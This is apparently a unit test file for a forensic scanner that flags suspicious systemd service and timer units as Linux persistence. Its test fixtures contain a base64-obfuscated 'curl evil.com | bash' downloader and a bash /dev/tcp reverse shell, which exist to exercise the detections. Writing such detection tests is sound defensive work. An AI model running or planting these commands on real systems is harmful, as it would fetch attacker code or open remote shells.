# Copyright 2024 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#    https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
"""Unit tests for Linux Systemd persistence parser."""

from __future__ import annotations

import os
import tempfile

from src.utils.linux_systemd import (
    LinuxSystemdParser,
    analyze_systemd,
    extract_and_decode_base64,
    extract_binary_and_script,
    parse_systemd_ini,
)
from src.utils.models import AnalysisTarget, RiskLevel


def test_cross_boundary_systemd_service():
    """Test detection of root system service executing out of user home directory."""
    with tempfile.TemporaryDirectory() as tmp_dir:
        svc_path = os.path.join(tmp_dir, "nginx-helper.service")
        content = """[Unit]
Description=Nginx Service Helper
After=network.target

[Service]
ExecStart=/home/www-data/.local/bin/helper_daemon --background
User=root
Restart=always

[Install]
WantedBy=multi-user.target
"""
        with open(svc_path, "w", encoding="utf-8") as f:
            f.write(content)

        target = AnalysisTarget(
            virtual_paths={"/etc/systemd/system/nginx-helper.service": svc_path}
        )
        findings = analyze_systemd(target)

        assert len(findings) == 1
        finding = findings[0]
        assert finding.category == "cross_boundary_systemd"
        assert finding.risk_level == RiskLevel.CRITICAL
        assert finding.technique_id == "T1543.002"
        assert finding.path == "/etc/systemd/system/nginx-helper.service"
        assert "SYSTEM_SERVICE_POINTS_TO_USER_HOME" in finding.details["flags"]
        assert "NON_ROOT_USER_PATH" in finding.details["flags"]
        assert finding.details["service_name"] == "nginx-helper.service"
        assert (
            finding.details["target_binary_path"]
            == "/home/www-data/.local/bin/helper_daemon"
        )
        assert finding.details["target_binary_owner"] == "www-data"
        assert (
            finding.details["system_config_path"]
            == "/etc/systemd/system/nginx-helper.service"
        )
        assert (
            finding.details["exec_start"]
            == "/home/www-data/.local/bin/helper_daemon --background"
        )
        assert finding.raw_content == content


def test_tmp_execution_service():
    """Test detection of service executing binary from /tmp or /dev/shm."""
    with tempfile.TemporaryDirectory() as tmp_dir:
        svc_path = os.path.join(tmp_dir, "tmp-runner.service")
        content = """[Unit]
Description=Temporary Runner

[Service]
ExecStartPre=/dev/shm/stage1.sh
ExecStart=/tmp/stage2_payload.bin --daemon
"""
        with open(svc_path, "w", encoding="utf-8") as f:
            f.write(content)

        target = AnalysisTarget(
            virtual_paths={"/etc/systemd/system/tmp-runner.service": svc_path}
        )
        findings = analyze_systemd(target)

        assert len(findings) == 1
        finding = findings[0]
        assert finding.category == "systemd_service"
        assert finding.risk_level == RiskLevel.CRITICAL
        assert "EXEC_FROM_TMP_OR_DEV_SHM" in finding.details["flags"]
        assert finding.details["service_name"] == "tmp-runner.service"
        assert finding.details["exec_start"] == "/tmp/stage2_payload.bin --daemon"
        assert finding.details["exec_start_pre"] == "/dev/shm/stage1.sh"


def test_user_service_with_linger():
    """Test detection of user systemd service when lingering session is enabled."""
    with tempfile.TemporaryDirectory() as tmp_dir:
        svc_path = os.path.join(tmp_dir, "user-sync.service")
        linger_path = os.path.join(tmp_dir, "deploy")

        with open(svc_path, "w", encoding="utf-8") as f:
            f.write("""[Unit]
Description=User Background Sync

[Service]
ExecStart=/usr/bin/python3 -m sync_daemon
Restart=always
""")

        with open(linger_path, "w", encoding="utf-8") as f:
            f.write("")

        target = AnalysisTarget(
            virtual_paths={
                "/home/deploy/.config/systemd/user/user-sync.service": svc_path,
                "/var/lib/systemd/linger/deploy": linger_path,
            }
        )
        findings = analyze_systemd(target)

        assert len(findings) == 1
        finding = findings[0]
        assert finding.category == "user_systemd_service"
        assert finding.risk_level == RiskLevel.MEDIUM
        assert "USER_SYSTEMD_UNIT" in finding.details["flags"]
        assert "USER_LINGER_ENABLED" in finding.details["flags"]
        assert finding.details["linger_enabled"] is True
        assert finding.details["user"] == "deploy"


def test_user_service_without_linger():
    """Test user systemd service without linger yields INFO risk level."""
    with tempfile.TemporaryDirectory() as tmp_dir:
        svc_path = os.path.join(tmp_dir, "normal-user.service")
        with open(svc_path, "w", encoding="utf-8") as f:
            f.write("""[Unit]
Description=Normal User Service

[Service]
ExecStart=/usr/bin/my-app
""")

        target = AnalysisTarget(
            virtual_paths={
                "/home/alice/.config/systemd/user/normal-user.service": svc_path
            }
        )
        findings = analyze_systemd(target)

        assert len(findings) == 1
        finding = findings[0]
        assert finding.category == "user_systemd_service"
        assert finding.risk_level == RiskLevel.INFO
        assert "USER_SYSTEMD_UNIT" in finding.details["flags"]
        assert "USER_LINGER_ENABLED" not in finding.details["flags"]
        assert finding.details.get("linger_enabled") is None


def test_timer_persistence():
    """Test parsing and detection of timer persistence mechanism."""
    with tempfile.TemporaryDirectory() as tmp_dir:
        timer_path = os.path.join(tmp_dir, "backup.timer")
        content = """[Unit]
Description=Weekly Backup Timer

[Timer]
OnBootSec=15min
OnUnitActiveSec=1w
OnCalendar=Sun *-*-* 02:00:00
Unit=backup.service

[Install]
WantedBy=timers.target
"""
        with open(timer_path, "w", encoding="utf-8") as f:
            f.write(content)

        target = AnalysisTarget(
            virtual_paths={"/etc/systemd/system/backup.timer": timer_path}
        )
        findings = analyze_systemd(target)

        assert len(findings) == 1
        finding = findings[0]
        assert finding.category == "systemd_timer"
        assert finding.risk_level == RiskLevel.INFO
        assert finding.technique_id == "T1543.002"
        assert finding.details["service_name"] == "backup.timer"
        assert finding.details["on_boot_sec"] == "15min"
        assert finding.details["on_unit_active_sec"] == "1w"
        assert finding.details["on_calendar"] == "Sun *-*-* 02:00:00"
        assert finding.details["unit"] == "backup.service"
        assert finding.details["flags"] == []


def test_benign_system_service():
    """Test benign system service has no flags and INFO risk."""
    with tempfile.TemporaryDirectory() as tmp_dir:
        svc_path = os.path.join(tmp_dir, "nginx.service")
        content = """[Unit]
Description=A high performance web server and a reverse proxy server
Documentation=man:nginx(8)
After=network.target nss-lookup.target

[Service]
Type=forking
PIDFile=/run/nginx.pid
ExecStartPre=/usr/sbin/nginx -t -q -g 'daemon on; master_process on;'
ExecStart=/usr/sbin/nginx -g 'daemon on; master_process on;'
ExecReload=/usr/sbin/nginx -g 'daemon on; master_process on;' -s reload
ExecStop=-/sbin/start-stop-daemon --quiet --stop --retry QUIT/5 --pidfile /run/nginx.pid
TimeoutStopSec=5
KillMode=mixed

[Install]
WantedBy=multi-user.target
"""
        with open(svc_path, "w", encoding="utf-8") as f:
            f.write(content)

        target = AnalysisTarget(
            virtual_paths={"/lib/systemd/system/nginx.service": svc_path}
        )
        findings = analyze_systemd(target)

        assert len(findings) == 1
        finding = findings[0]
        assert finding.category == "systemd_service"
        assert finding.risk_level == RiskLevel.INFO
        assert finding.details["flags"] == []
        assert (
            finding.details["exec_start"]
            == "/usr/sbin/nginx -g 'daemon on; master_process on;'"
        )
        assert finding.details["target_binary_path"] == "/usr/sbin/nginx"


def test_hidden_path_execution():
    """Test execution from hidden path or hidden executable name."""
    with tempfile.TemporaryDirectory() as tmp_dir:
        svc_path = os.path.join(tmp_dir, "hidden.service")
        with open(svc_path, "w", encoding="utf-8") as f:
            f.write("""[Unit]
Description=Stealth Service

[Service]
ExecStart=/opt/.hidden/stealth_daemon --run
""")

        target = AnalysisTarget(
            virtual_paths={"/etc/systemd/system/hidden.service": svc_path}
        )
        findings = analyze_systemd(target)

        assert len(findings) == 1
        finding = findings[0]
        assert "HIDDEN_PATH_EXECUTION" in finding.details["flags"]
        assert finding.risk_level == RiskLevel.HIGH


def test_suspicious_shell_and_base64_payload():
    """Test detection of inline shell execution and base64 payload decoding."""
    with tempfile.TemporaryDirectory() as tmp_dir:
        svc_path = os.path.join(tmp_dir, "b64.service")
        # Base64 for 'curl http://evil.com/shell.sh | bash'
        # Y3VybCBodHRwOi8vZXZpbC5jb20vc2hlbGwuc2ggfCBiYXNo
        with open(svc_path, "w", encoding="utf-8") as f:
            f.write("""[Unit]
Description=Updater

[Service]
ExecStart=/bin/sh -c "echo 'Y3VybCBodHRwOi8vZXZpbC5jb20vc2hlbGwuc2ggfCBiYXNo' | base64 -d | sh"
""")

        target = AnalysisTarget(
            virtual_paths={"/etc/systemd/system/b64.service": svc_path}
        )
        findings = analyze_systemd(target)

        assert len(findings) == 1
        finding = findings[0]
        assert "SUSPICIOUS_SHELL_EXECUTION" in finding.details["flags"]
        assert "BASE64_PAYLOAD" in finding.details["flags"]
        assert "OBFUSCATED_COMMAND" in finding.details["flags"]
        assert finding.decoded_payload == "curl http://evil.com/shell.sh | bash"
        assert (
            finding.details["decoded_payload"] == "curl http://evil.com/shell.sh | bash"
        )
        assert finding.risk_level == RiskLevel.HIGH


def test_reverse_shell_pattern():
    """Test detection of reverse shell indicators in ExecStart."""
    with tempfile.TemporaryDirectory() as tmp_dir:
        svc_path = os.path.join(tmp_dir, "revshell.service")
        with open(svc_path, "w", encoding="utf-8") as f:
            f.write("""[Unit]
Description=Reverse Shell

[Service]
ExecStart=/bin/bash -i >& /dev/tcp/192.168.1.100/4444 0>&1
""")

        target = AnalysisTarget(
            virtual_paths={"/etc/systemd/system/revshell.service": svc_path}
        )
        findings = analyze_systemd(target)

        assert len(findings) == 1
        finding = findings[0]
        assert "REVERSE_SHELL_PATTERN" in finding.details["flags"]
        assert finding.risk_level == RiskLevel.CRITICAL


def test_ini_parser_multiline_continuation():
    """Test line continuations and comment handling in unit parser."""
    content = """# Comment line 1
; Comment line 2
[Unit]
Description=Multi-line \\
    Description Test

[Service]
ExecStart=/bin/foo \\
    --arg1 \\
    --arg2
ConditionPathExists=/etc/foo/config
User=root
"""
    parsed = parse_systemd_ini(content)
    assert "Unit" in parsed
    assert "Service" in parsed
    assert parsed["Unit"]["Description"] == ["Multi-line Description Test"]
    assert parsed["Service"]["ExecStart"] == ["/bin/foo --arg1 --arg2"]
    assert parsed["Service"]["ConditionPathExists"] == ["/etc/foo/config"]
    assert parsed["Service"]["User"] == ["root"]


def test_extract_binary_and_script():
    """Test binary and script path extraction from exec command lines."""
    bin_path, script_path = extract_binary_and_script(
        "/home/www-data/.local/bin/helper_daemon --background"
    )
    assert bin_path == "/home/www-data/.local/bin/helper_daemon"
    assert script_path is None

    bin_path, script_path = extract_binary_and_script("-/bin/bash /tmp/evil.sh")
    assert bin_path == "/bin/bash"
    assert script_path == "/tmp/evil.sh"

    bin_path, script_path = extract_binary_and_script("@/usr/bin/daemon arg1")
    assert bin_path == "/usr/bin/daemon"
    assert script_path is None


def test_extract_and_decode_base64():
    """Test decoding of base64 payloads from exec lines."""
    res = extract_and_decode_base64("echo 'ZXhhbXBsZSBjb21tYW5k' | base64 -d | sh")
    assert res == "example command"

    res_none = extract_and_decode_base64("/usr/bin/daemon --normal")
    assert res_none is None


def test_class_interface_parse():
    """Test LinuxSystemdParser.parse class method dispatch."""
    with tempfile.TemporaryDirectory() as tmp_dir:
        svc_path = os.path.join(tmp_dir, "test.service")
        with open(svc_path, "w", encoding="utf-8") as f:
            f.write("""[Service]
ExecStart=/usr/bin/test
""")
        target = AnalysisTarget(
            virtual_paths={"/etc/systemd/system/test.service": svc_path}
        )
        findings = LinuxSystemdParser.parse(target)
        assert len(findings) == 1
        assert findings[0].path == "/etc/systemd/system/test.service"


def test_disk_image_filesystem_target():
    """Test scan using AnalysisTarget with a root filesystem directory."""
    with tempfile.TemporaryDirectory() as root_dir:
        sys_dir = os.path.join(root_dir, "etc", "systemd", "system")
        os.makedirs(sys_dir, exist_ok=True)
        svc_path = os.path.join(sys_dir, "fs-test.service")
        with open(svc_path, "w", encoding="utf-8") as f:
            f.write("""[Unit]
Description=FS Root Service

[Service]
ExecStart=/usr/bin/fs_daemon
""")

        target = AnalysisTarget(root_path=root_dir)
        findings = analyze_systemd(target)

        assert len(findings) == 1
        assert findings[0].path == "/etc/systemd/system/fs-test.service"
        assert findings[0].category == "systemd_service"
        assert findings[0].risk_level == RiskLevel.INFO
